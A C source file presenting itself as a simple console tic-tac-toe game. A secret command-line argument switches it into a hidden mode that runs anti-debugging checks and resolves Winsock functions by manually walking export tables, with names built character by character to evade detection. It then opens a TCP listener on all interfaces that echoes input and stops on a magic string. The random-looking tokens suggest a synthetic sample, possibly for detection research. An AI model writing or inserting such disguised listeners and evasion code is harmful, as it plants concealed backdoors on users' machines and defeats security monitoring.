#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

// PEB structure for anti-debugging
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
    PVOID ProcessParameters;
    BYTE Reserved4[104];
    PVOID Reserved5[52];
    PVOID PostProcessInitRoutine;
    BYTE Reserved6[128];
    PVOID Reserved7[1];
    ULONG SessionId;
    BYTE Reserved8[8];
    ULONG NtGlobalFlag;
    BYTE Reserved9[4];
    LARGE_INTEGER CriticalSectionTimeout;
    ULONG HeapSegmentReserve;
    ULONG HeapSegmentCommit;
    ULONG HeapDeCommitTotalFreeThreshold;
    ULONG HeapDeCommitFreeBlockThreshold;
    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID ProcessHeaps;
} PEB, *PPEB;


char board[9] = { '1','2','3','4','5','6','7','8','9' };

void DrawBoard() {
    int i;
    for (i = 0; i < 9; i++) {
        printf(" %c ", board[i]);
        if ((i + 1) % 3 == 0) {
            printf("\n");
            if (i < 6) printf("---+---+---\n");
        } else {
            printf("|");
        }
    }
    printf("\n");
}

int IsWin() {
    int wins[8][3] = {
        {0,1,2}, {3,4,5}, {6,7,8}, // rows
        {0,3,6}, {1,4,7}, {2,5,8}, // cols
        {0,4,8}, {2,4,6}           // diagonals
    };
    int i;
    for (i = 0; i < 8; i++) {
        int a = wins[i][0], b = wins[i][1], c = wins[i][2];
        if (board[a] == board[b] && board[b] == board[c])
            return 1;
    }
    return 0;
}

int IsDraw() {
    int i;
    for (i = 0; i < 9; i++) {
        if (board[i] != 'X' && board[i] != 'O') return 0;
    }
    return 1;
}

int MakeMove(int pos, char player) {
    if (pos < 1 || pos > 9) return 0;
    if (board[pos - 1] == 'X' || board[pos - 1] == 'O') return 0;
    board[pos - 1] = player;
    return 1;
}

// Manual function address resolution to avoid GetProcAddress detection
FARPROC getFunc(HMODULE hMod, const char* funcName) {
    if (!hMod || !funcName) return NULL;
    
    // Get DOS header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hMod;
    if (dosHeader->e_magic != 0x5A4D) return NULL; // "MZ"
    
    // Get NT headers
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dosHeader->e_lfanew);
    if (ntHeaders->Signature != 0x00004550) return NULL; // "PE\0\0"
    
    // Get export directory
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + 
        ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress); // IMAGE_DIRECTORY_ENTRY_EXPORT = 0
    
    if (!exportDir) return NULL;
    
    // Get export tables
    DWORD* nameArray = (DWORD*)((BYTE*)hMod + exportDir->AddressOfNames);
    DWORD* addressArray = (DWORD*)((BYTE*)hMod + exportDir->AddressOfFunctions);
    WORD* ordinalArray = (WORD*)((BYTE*)hMod + exportDir->AddressOfNameOrdinals);
    
    // Search for function
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)hMod + nameArray[i]);
        if (strcmp(name, funcName) == 0) {
            WORD ordinal = ordinalArray[i];
            DWORD funcAddress = addressArray[ordinal];
            return (FARPROC)((BYTE*)hMod + funcAddress);
        }
    }
    return NULL;
}


void antiDebug() {
    // 1. Simple timing delay
    volatile int dummy = 0;
    for (int i = 0; i < 100; i++) {
        dummy += i;
    }
    
    // 2. Check TEB/PEB directly without any API calls
    // Use inline assembly to access fs:[30h] (PEB)
    PPEB peb = NULL;
    __asm("movl %%fs:0x30, %0" : "=r" (peb));
    
    // Check BeingDebugged flag in PEB
    if (peb && peb->BeingDebugged) {
        ExitProcess(0);
    }
    
    // Check NtGlobalFlag in PEB  
    if (peb && (peb->NtGlobalFlag & 0x70)) {
        ExitProcess(0);
    }
    
    // 3. Indirect heap checks without explicit API resolution
    HANDLE heap = GetProcessHeap();
    if (heap) {
        void* ptr1 = HeapAlloc(heap, 0, 100);
        void* ptr2 = HeapAlloc(heap, 0, 100);
        if (ptr1 && ptr2) {
            DWORD diff = (DWORD)((char*)ptr2 - (char*)ptr1);
            // Check for debug heap patterns
            if (diff > 0x10000 || diff < 16) {
                HeapFree(heap, 0, ptr1);
                HeapFree(heap, 0, ptr2);
                ExitProcess(0);
            }
            HeapFree(heap, 0, ptr1);
            HeapFree(heap, 0, ptr2);
        }
    }
    
    // 4. Timing-based detection using only standard APIs
    DWORD start = GetTickCount();
    for (volatile int j = 0; j < 10000; j++) {
        dummy += j;
    }
    DWORD elapsed = GetTickCount() - start;
    
    // Check for unusual execution timing
    if (elapsed > 1000) {
        ExitProcess(0);
    }
}

// Function pointers for dynamic loading
typedef int (WINAPI *WSAStartup_t)(WORD, LPWSADATA);
typedef int (WINAPI *WSACleanup_t)(void);
typedef SOCKET (WINAPI *socket_t)(int, int, int);
typedef int (WINAPI *bind_t)(SOCKET, const struct sockaddr*, int);
typedef int (WINAPI *listen_t)(SOCKET, int);
typedef SOCKET (WINAPI *accept_t)(SOCKET, struct sockaddr*, int*);
typedef int (WINAPI *recv_t)(SOCKET, char*, int, int);
typedef int (WINAPI *send_t)(SOCKET, const char*, int, int);
typedef int (WINAPI *closesocket_t)(SOCKET);
typedef u_short (WINAPI *htons_t)(u_short);

void startTcpServer() {
    // Anti-debugging at start
    antiDebug();
    
    // Load ws2_32.dll dynamically with obfuscated string
    char dllname[16];
    dllname[0] = 'w'; dllname[1] = 's'; dllname[2] = '2'; dllname[3] = '_';
    dllname[4] = '3'; dllname[5] = '2'; dllname[6] = '.'; dllname[7] = 'd';
    dllname[8] = 'l'; dllname[9] = 'l'; dllname[10] = '\0';
    HMODULE ws2_32 = LoadLibraryA(dllname);
    if (!ws2_32) return;
    
    // Construct function names at runtime to avoid string detection
    char startup[16];
    startup[0] = 'W'; startup[1] = 'S'; startup[2] = 'A'; startup[3] = 'S';
    startup[4] = 't'; startup[5] = 'a'; startup[6] = 'r'; startup[7] = 't';
    startup[8] = 'u'; startup[9] = 'p'; startup[10] = '\0';
    
    char cleanup[16];
    cleanup[0] = 'W'; cleanup[1] = 'S'; cleanup[2] = 'A'; cleanup[3] = 'C';
    cleanup[4] = 'l'; cleanup[5] = 'e'; cleanup[6] = 'a'; cleanup[7] = 'n';
    cleanup[8] = 'u'; cleanup[9] = 'p'; cleanup[10] = '\0';
    
    char socketfn[16];
    socketfn[0] = 's'; socketfn[1] = 'o'; socketfn[2] = 'c'; socketfn[3] = 'k';
    socketfn[4] = 'e'; socketfn[5] = 't'; socketfn[6] = '\0';
    
    char bindfn[16];
    bindfn[0] = 'b'; bindfn[1] = 'i'; bindfn[2] = 'n'; bindfn[3] = 'd';
    bindfn[4] = '\0';
    
    char listenfn[16];
    listenfn[0] = 'l'; listenfn[1] = 'i'; listenfn[2] = 's'; listenfn[3] = 't';
    listenfn[4] = 'e'; listenfn[5] = 'n'; listenfn[6] = '\0';
    
    char acceptfn[16];
    acceptfn[0] = 'a'; acceptfn[1] = 'c'; acceptfn[2] = 'c'; acceptfn[3] = 'e';
    acceptfn[4] = 'p'; acceptfn[5] = 't'; acceptfn[6] = '\0';
    
    char recvfn[16];
    recvfn[0] = 'r'; recvfn[1] = 'e'; recvfn[2] = 'c'; recvfn[3] = 'v';
    recvfn[4] = '\0';
    
    char sendfn[16];
    sendfn[0] = 's'; sendfn[1] = 'e'; sendfn[2] = 'n'; sendfn[3] = 'd';
    sendfn[4] = '\0';
    
    char closefn[16];
    closefn[0] = 'c'; closefn[1] = 'l'; closefn[2] = 'o'; closefn[3] = 's';
    closefn[4] = 'e'; closefn[5] = 's'; closefn[6] = 'o'; closefn[7] = 'c';
    closefn[8] = 'k'; closefn[9] = 'e'; closefn[10] = 't'; closefn[11] = '\0';
    
    char htonsfn[16];
    htonsfn[0] = 'h'; htonsfn[1] = 't'; htonsfn[2] = 'o'; htonsfn[3] = 'n';
    htonsfn[4] = 's'; htonsfn[5] = '\0';
    
    WSAStartup_t pWSAStartup = (WSAStartup_t)getFunc(ws2_32, startup);
    WSACleanup_t pWSACleanup = (WSACleanup_t)getFunc(ws2_32, cleanup);
    socket_t psocket = (socket_t)getFunc(ws2_32, socketfn);
    bind_t pbind = (bind_t)getFunc(ws2_32, bindfn);
    listen_t plisten = (listen_t)getFunc(ws2_32, listenfn);
    accept_t paccept = (accept_t)getFunc(ws2_32, acceptfn);
    recv_t precv = (recv_t)getFunc(ws2_32, recvfn);
    send_t psend = (send_t)getFunc(ws2_32, sendfn);
    closesocket_t pclosesocket = (closesocket_t)getFunc(ws2_32, closefn);
    htons_t phtons = (htons_t)getFunc(ws2_32, htonsfn);
    
    if (!pWSAStartup || !pWSACleanup || !psocket || !pbind || !plisten || 
        !paccept || !precv || !psend || !pclosesocket || !phtons) {
        FreeLibrary(ws2_32);
        return;
    }
    
    WSADATA wsaData;
    SOCKET listenSocket = INVALID_SOCKET;
    SOCKET clientSocket = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
    struct sockaddr_in clientAddr;
    int clientAddrLen = sizeof(clientAddr);
    char buffer[1024];
    int result;

    // Initialize Winsock
    result = pWSAStartup(MAKEWORD(2,2), &wsaData);
    if (result != 0) {
        FreeLibrary(ws2_32);
        return;
    }

    // Create socket
    listenSocket = psocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        pWSACleanup();
        FreeLibrary(ws2_32);
        return;
    }

    // Setup server address
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = phtons(14709);

    // Bind socket
    result = pbind(listenSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    if (result == SOCKET_ERROR) {
        pclosesocket(listenSocket);
        pWSACleanup();
        FreeLibrary(ws2_32);
        return;
    }

    // Listen for connections
    result = plisten(listenSocket, SOMAXCONN);
    if (result == SOCKET_ERROR) {
        pclosesocket(listenSocket);
        pWSACleanup();
        FreeLibrary(ws2_32);
        return;
    }

    // Accept connections
    while (1) {
        
        clientSocket = paccept(listenSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
        if (clientSocket == INVALID_SOCKET) {
            continue;
        }

        // Handle client
        while (1) {
            memset(buffer, 0, sizeof(buffer));
            result = precv(clientSocket, buffer, sizeof(buffer) - 1, 0);
            
            if (result > 0) {
                buffer[result] = '\0';
                
                // Check for special message
                if (strcmp(buffer, "msg_U3SR3Z3BAU") == 0) {
                    psend(clientSocket, "res_XIXO0J3TJN", 14, 0);
                    pclosesocket(clientSocket);
                    pclosesocket(listenSocket);
                    pWSACleanup();
                    FreeLibrary(ws2_32);
                    return;
                } else {
                    // Echo the message back
                    psend(clientSocket, buffer, result, 0);
                }
            } else if (result == 0) {
                break;
            } else {
                break;
            }
        }
        
        pclosesocket(clientSocket);
    }

    pclosesocket(listenSocket);
    pWSACleanup();
    FreeLibrary(ws2_32);
}

void playGame() {
    char currentPlayer = 'X';
    while (1) {
        DrawBoard();
        printf("Player %c, enter position (1-9): ", currentPlayer);
        int move;
        if (scanf("%d", &move) != 1) {
            while (getchar() != '\n'); // clear invalid input
            printf("Invalid input. Try again.\n");
            continue;
        }
        if (!MakeMove(move, currentPlayer)) {
            printf("Invalid move. Try again.\n");
            continue;
        }
        if (IsWin()) {
            DrawBoard();
            printf("Player %c wins!\n", currentPlayer);
            break;
        }
        if (IsDraw()) {
            DrawBoard();
            printf("It's a draw!\n");
            break;
        }
        currentPlayer = (currentPlayer == 'X') ? 'O' : 'X';
    }
}

int main(int argc, char* argv[]) {
    // Check for special argument to activate server mode
    if (argc > 1 && strcmp(argv[1], "arg_YB3LTIW2BY") == 0) {
        startTcpServer();
        return 0;
    }
    
    printf("Welcome to Tic Tac Toe!\n");
    printf("This is a simple console-based Tic Tac Toe game.\n");
    playGame();
    return 0;
}
